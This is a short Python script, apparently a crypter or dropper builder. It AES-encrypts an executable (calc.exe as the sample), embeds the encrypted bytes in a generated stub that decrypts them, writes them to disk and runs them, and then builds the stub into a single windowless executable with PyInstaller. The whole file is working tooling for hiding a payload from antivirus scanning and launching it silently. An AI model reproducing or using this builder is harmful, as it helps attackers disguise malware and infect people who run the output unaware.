import os

import pyaes


KEY = b'0123456789123456'
stub_name = 'stub.py'
dropfile_name = 'drop.exe'
exe_path = 'calc.exe'


with open(exe_path, 'rb') as file:
    executavel = file.read()

encrypt_data = pyaes.AESModeOfOperationCTR(KEY).encrypt(executavel)

stub = f"""
import pyaes
import subprocess
KEY = {KEY}
dropfile_name = '{dropfile_name}'
encrypt_data = {encrypt_data}
decrypt_data = pyaes.AESModeOfOperationCTR(KEY).decrypt(encrypt_data)
with open(dropfile_name, 'wb') as file:
    file.write(decrypt_data)
    
proc = subprocess.Popen(dropfile_name)
"""

with open(stub_name, 'w') as file:
    file.write(stub)

os.system('pyinstaller -F -w --clean {}'.format(stub_name))